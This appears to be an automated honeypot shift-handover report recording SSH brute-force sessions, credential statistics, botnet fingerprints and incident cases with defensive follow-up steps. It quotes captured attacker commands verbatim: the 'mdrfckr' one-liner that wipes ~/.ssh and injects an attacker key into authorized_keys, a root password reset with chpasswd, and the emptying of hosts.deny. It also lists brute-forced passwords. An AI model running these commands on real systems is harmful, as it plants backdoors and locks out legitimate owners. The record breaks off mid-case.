# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-09 |
| **Generated At** | 2026-06-09T07:54:38Z |
| **Shift Time** | 07:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **669** |
| Confirmed Threats | **634** |
| False Positives Filtered | **35** (5.2%) |
| Unique Attacker IPs | **56** |
| Countries of Origin | **13** |
| High Severity Cases | **124** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **545** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **289** |
| Unique Credential Pairs | **145** |
| Unique Usernames | **78** |
| Unique Passwords | **133** |
| Successful Auth Pairs | **74** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 124 |
| `345gs5662d34` | 57 |
| `user` | 7 |
| `ubuntu` | 4 |
| `admin` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 59 |
| `345gs5662d34` | 57 |
| `password` | 6 |
| `123` | 5 |
| `123456` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 59 |
| `345gs5662d34` | `345gs5662d34` | 57 |
| `jack` | `jack1234` | 2 |
| `ddd` | `1234` | 2 |
| `ftpuser` | `1q2w3e4r5t` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Abc123!!!` | `110.93.224.226` | 2026-06-09T04:02:02 |
| `root` | `3245gs5662d34` | `110.93.224.226` | 2026-06-09T04:02:06 |
| `root` | `bgj948888` | `182.18.139.237` | 2026-06-09T04:07:45 |
| `root` | `3245gs5662d34` | `182.18.139.237` | 2026-06-09T04:07:46 |
| `root` | `Aptx4869` | `173.249.52.138` | 2026-06-09T04:09:02 |
| `root` | `3245gs5662d34` | `173.249.52.138` | 2026-06-09T04:09:05 |
| `root` | `Ly123456!` | `173.249.52.138` | 2026-06-09T04:12:05 |
| `root` | `Wu123456` | `173.249.52.138` | 2026-06-09T04:15:15 |
| `root` | `5211314a` | `173.249.52.138` | 2026-06-09T04:18:32 |
| `root` | `Password_2025` | `182.18.139.237` | 2026-06-09T04:19:03 |
| `root` | `Admin@123qwe` | `173.249.52.138` | 2026-06-09T04:21:49 |
| `root` | `Hj123456.` | `182.18.139.237` | 2026-06-09T04:24:39 |
| `root` | `Servidor1` | `173.249.52.138` | 2026-06-09T04:24:55 |
| `root` | `Qwerty654321` | `182.18.139.237` | 2026-06-09T04:26:30 |
| `root` | `Qwe123456@` | `182.18.139.237` | 2026-06-09T04:28:18 |
| `root` | `123456789001` | `182.18.139.237` | 2026-06-09T04:30:04 |
| `root` | `P@ssW0rd2026` | `173.249.52.138` | 2026-06-09T04:31:14 |
| `root` | `Dx@123456` | `182.18.139.237` | 2026-06-09T04:31:55 |
| `root` | `scooter` | `182.18.139.237` | 2026-06-09T04:35:32 |
| `root` | `loollzz321` | `182.18.139.237` | 2026-06-09T04:37:24 |
| `root` | `monica` | `173.249.52.138` | 2026-06-09T04:39:18 |
| `root` | `Sw@123456` | `182.18.139.237` | 2026-06-09T04:46:42 |
| `root` | `Abc123++` | `173.249.52.138` | 2026-06-09T04:47:13 |
| `root` | `P@ssw0rd1` | `182.18.139.237` | 2026-06-09T04:48:36 |
| `root` | `Qwer123$` | `182.18.139.237` | 2026-06-09T04:52:22 |
| `root` | `Linux2026` | `182.18.139.237` | 2026-06-09T04:54:14 |
| `root` | `1q2w3e4r` | `106.13.181.42` | 2026-06-09T05:44:51 |
| `root` | `3245gs5662d34` | `106.13.181.42` | 2026-06-09T05:45:08 |
| `root` | `baidu@123` | `31.56.178.132` | 2026-06-09T05:50:09 |
| `root` | `3245gs5662d34` | `31.56.178.132` | 2026-06-09T05:50:15 |
| `root` | `123456789101112` | `103.38.219.22` | 2026-06-09T05:52:04 |
| `root` | `3245gs5662d34` | `103.38.219.22` | 2026-06-09T05:52:05 |
| `root` | `Abc123456789@` | `106.13.181.42` | 2026-06-09T05:52:49 |
| `root` | `passroot` | `31.56.178.132` | 2026-06-09T05:57:58 |
| `root` | `VPS` | `103.38.219.22` | 2026-06-09T06:00:15 |
| `root` | `P@SSW0RD` | `103.38.219.22` | 2026-06-09T06:02:17 |
| `root` | `root4` | `92.126.223.175` | 2026-06-09T06:02:25 |
| `root` | `aliali` | `103.38.219.22` | 2026-06-09T06:04:33 |
| `root` | `123456789101112` | `31.56.178.132` | 2026-06-09T06:09:04 |
| `root` | `qwe@123456` | `117.80.226.34` | 2026-06-09T06:10:40 |
| `root` | `P@SSW0RD` | `31.56.178.132` | 2026-06-09T06:12:49 |
| `root` | `Hh@123456789` | `103.38.219.22` | 2026-06-09T06:16:34 |
| `root` | `baidu@123` | `103.38.219.22` | 2026-06-09T06:20:34 |
| `root` | `Hh@123456789` | `31.56.178.132` | 2026-06-09T06:22:05 |
| `root` | `aliali` | `31.56.178.132` | 2026-06-09T06:23:58 |
| `root` | `@A123456` | `31.56.178.132` | 2026-06-09T06:25:50 |
| `root` | `2wsxCDE#4rfv` | `103.38.219.22` | 2026-06-09T06:26:43 |
| `root` | `VPS` | `31.56.178.132` | 2026-06-09T06:28:33 |
| `root` | `9999` | `117.80.226.34` | 2026-06-09T06:32:09 |
| `root` | `qwert` | `103.38.219.22` | 2026-06-09T06:34:54 |
| `root` | `qwert` | `31.56.178.132` | 2026-06-09T06:39:45 |
| `root` | `welcome@2026` | `117.80.226.34` | 2026-06-09T06:40:00 |
| `root` | `passroot` | `103.38.219.22` | 2026-06-09T06:41:18 |
| `root` | `2wsxCDE#4rfv` | `31.56.178.132` | 2026-06-09T06:41:34 |
| `root` | `111111` | `173.249.0.223` | 2026-06-09T06:44:26 |
| `root` | `3245gs5662d34` | `173.249.0.223` | 2026-06-09T06:44:29 |
| `root` | `@A123456` | `103.38.219.22` | 2026-06-09T06:45:19 |
| `root` | `Nadx@2024` | `182.44.38.181` | 2026-06-09T06:48:41 |
| `root` | `3245gs5662d34` | `182.44.38.181` | 2026-06-09T06:48:57 |
| `root` | `Cx123456.` | `38.148.249.2` | 2026-06-09T07:06:09 |
| `root` | `3245gs5662d34` | `38.148.249.2` | 2026-06-09T07:06:14 |
| `root` | `Aa666888` | `14.103.118.177` | 2026-06-09T07:07:55 |
| `root` | `QWEasd123!@#` | `38.148.249.2` | 2026-06-09T07:09:42 |
| `root` | `Admin@2025` | `38.148.249.2` | 2026-06-09T07:13:10 |
| `root` | `Aa147258...` | `38.148.249.2` | 2026-06-09T07:16:39 |
| `root` | `My123456@` | `38.148.249.2` | 2026-06-09T07:18:31 |
| `root` | `123@123A` | `38.148.249.2` | 2026-06-09T07:23:58 |
| `root` | `Vy@123456789` | `38.148.249.2` | 2026-06-09T07:27:29 |
| `root` | `ABcd@1234` | `38.148.249.2` | 2026-06-09T07:32:43 |
| `root` | `Hr123456` | `38.148.249.2` | 2026-06-09T07:34:30 |
| `root` | `Toor` | `38.148.249.2` | 2026-06-09T07:36:22 |
| `root` | `Yw@123456` | `38.148.249.2` | 2026-06-09T07:40:00 |
| `root` | `ubuntu2025` | `38.148.249.2` | 2026-06-09T07:43:33 |
| `root` | `Passw0rd@2024` | `38.148.249.2` | 2026-06-09T07:52:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **669** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 388 |
| OpenSSH | 7 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 316 | 14 |
| `03a80b21afa8...` | Modern SSH client | 59 | 5 |
| `acaa53e0a7d7...` | Mirai/variant | 7 | 7 |
| `af8223ac9914...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 316 | 14 | Mirai/variant |
| `03a80b21afa8...` | libssh | 59 | 5 | Modern SSH client |
| `95420f9d932d...` | libssh | 12 | 7 | — |
| `acaa53e0a7d7...` | OpenSSH | 7 | 7 | Mirai/variant |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 59 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:0cC3lIEe2P8l"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.118.177`, `117.80.226.34`, `106.13.181.42`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `182.44.38.181`, `31.56.178.132`, `182.18.139.237`, `106.13.181.42`, `110.93.224.226`, `173.249.52.138`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **56** |
| Unique ASNs | **37** |
| High-Risk ASNs | **30** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS51167` | Contabo GmbH | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (124)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2c1ec972bc8a

| Field | Detail |
|---|---|
| **Source IP** | `110.93.224[.]226` |
| **First Seen** | 2026-06-09 04:02 |
| **Last Seen** | 2026-06-09 04:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:02:01` | `cowrie.session.connect` |
| `2026-06-09 04:02:01` | `cowrie.client.version` |
| `2026-06-09 04:02:01` | `cowrie.client.kex` |
| `2026-06-09 04:02:02` | `cowrie.login.success` |
| `2026-06-09 04:02:02` | `cowrie.session.params` |
| `2026-06-09 04:02:02` | `cowrie.command.input` |
| `2026-06-09 04:02:02` | `cowrie.command.failed` |
| `2026-06-09 04:02:02` | `cowrie.log.closed` |
| `2026-06-09 04:02:03` | `cowrie.session.params` |
| `2026-06-09 04:02:03` | `cowrie.command.input` |
| `2026-06-09 04:02:03` | `cowrie.session.file_download` |
| `2026-06-09 04:02:03` | `cowrie.log.closed` |
| `2026-06-09 04:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.93.224[.]226` to AbuseIPDB if not already reported
- [ ] Block `110.93.224[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b9b80f0ee39

| Field | Detail |
|---|---|
| **Source IP** | `110.93.224[.]226` |
| **First Seen** | 2026-06-09 04:02 |
| **Last Seen** | 2026-06-09 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:02:05` | `cowrie.session.connect` |
| `2026-06-09 04:02:05` | `cowrie.client.version` |
| `2026-06-09 04:02:05` | `cowrie.client.kex` |
| `2026-06-09 04:02:06` | `cowrie.login.success` |
| `2026-06-09 04:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.93.224[.]226` to AbuseIPDB if not already reported
- [ ] Block `110.93.224[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a2fdccc7699

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:07 |
| **Last Seen** | 2026-06-09 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:07:45` | `cowrie.session.connect` |
| `2026-06-09 04:07:45` | `cowrie.client.version` |
| `2026-06-09 04:07:45` | `cowrie.client.kex` |
| `2026-06-09 04:07:45` | `cowrie.login.success` |
| `2026-06-09 04:07:45` | `cowrie.session.params` |
| `2026-06-09 04:07:45` | `cowrie.command.input` |
| `2026-06-09 04:07:45` | `cowrie.command.failed` |
| `2026-06-09 04:07:45` | `cowrie.log.closed` |
| `2026-06-09 04:07:45` | `cowrie.session.params` |
| `2026-06-09 04:07:45` | `cowrie.command.input` |
| `2026-06-09 04:07:45` | `cowrie.session.file_download` |
| `2026-06-09 04:07:45` | `cowrie.log.closed` |
| `2026-06-09 04:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c8c0c0be00c

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:07 |
| **Last Seen** | 2026-06-09 04:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:07:46` | `cowrie.session.connect` |
| `2026-06-09 04:07:46` | `cowrie.client.version` |
| `2026-06-09 04:07:46` | `cowrie.client.kex` |
| `2026-06-09 04:07:46` | `cowrie.login.success` |
| `2026-06-09 04:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-252c2c181d95

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:09 |
| **Last Seen** | 2026-06-09 04:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:09:01` | `cowrie.session.connect` |
| `2026-06-09 04:09:01` | `cowrie.client.version` |
| `2026-06-09 04:09:01` | `cowrie.client.kex` |
| `2026-06-09 04:09:02` | `cowrie.login.success` |
| `2026-06-09 04:09:02` | `cowrie.session.params` |
| `2026-06-09 04:09:02` | `cowrie.command.input` |
| `2026-06-09 04:09:02` | `cowrie.command.failed` |
| `2026-06-09 04:09:03` | `cowrie.log.closed` |
| `2026-06-09 04:09:03` | `cowrie.session.params` |
| `2026-06-09 04:09:03` | `cowrie.command.input` |
| `2026-06-09 04:09:03` | `cowrie.session.file_download` |
| `2026-06-09 04:09:03` | `cowrie.log.closed` |
| `2026-06-09 04:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d820390ac471

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:09 |
| **Last Seen** | 2026-06-09 04:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:09:05` | `cowrie.session.connect` |
| `2026-06-09 04:09:05` | `cowrie.client.version` |
| `2026-06-09 04:09:05` | `cowrie.client.kex` |
| `2026-06-09 04:09:05` | `cowrie.login.success` |
| `2026-06-09 04:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c3f0a563d9d

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:12 |
| **Last Seen** | 2026-06-09 04:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:12:05` | `cowrie.session.connect` |
| `2026-06-09 04:12:05` | `cowrie.client.version` |
| `2026-06-09 04:12:05` | `cowrie.client.kex` |
| `2026-06-09 04:12:05` | `cowrie.login.success` |
| `2026-06-09 04:12:06` | `cowrie.session.params` |
| `2026-06-09 04:12:06` | `cowrie.command.input` |
| `2026-06-09 04:12:06` | `cowrie.command.failed` |
| `2026-06-09 04:12:06` | `cowrie.log.closed` |
| `2026-06-09 04:12:06` | `cowrie.session.params` |
| `2026-06-09 04:12:06` | `cowrie.command.input` |
| `2026-06-09 04:12:06` | `cowrie.session.file_download` |
| `2026-06-09 04:12:06` | `cowrie.log.closed` |
| `2026-06-09 04:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eb301eac086

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:12 |
| **Last Seen** | 2026-06-09 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:12:08` | `cowrie.session.connect` |
| `2026-06-09 04:12:08` | `cowrie.client.version` |
| `2026-06-09 04:12:08` | `cowrie.client.kex` |
| `2026-06-09 04:12:09` | `cowrie.login.success` |
| `2026-06-09 04:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49c33debad5d

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:15 |
| **Last Seen** | 2026-06-09 04:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:15:15` | `cowrie.session.connect` |
| `2026-06-09 04:15:15` | `cowrie.client.version` |
| `2026-06-09 04:15:15` | `cowrie.client.kex` |
| `2026-06-09 04:15:15` | `cowrie.login.success` |
| `2026-06-09 04:15:16` | `cowrie.session.params` |
| `2026-06-09 04:15:16` | `cowrie.command.input` |
| `2026-06-09 04:15:16` | `cowrie.command.failed` |
| `2026-06-09 04:15:16` | `cowrie.log.closed` |
| `2026-06-09 04:15:16` | `cowrie.session.params` |
| `2026-06-09 04:15:16` | `cowrie.command.input` |
| `2026-06-09 04:15:16` | `cowrie.session.file_download` |
| `2026-06-09 04:15:16` | `cowrie.log.closed` |
| `2026-06-09 04:15:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10bd66f73e34

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:15 |
| **Last Seen** | 2026-06-09 04:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:15:18` | `cowrie.session.connect` |
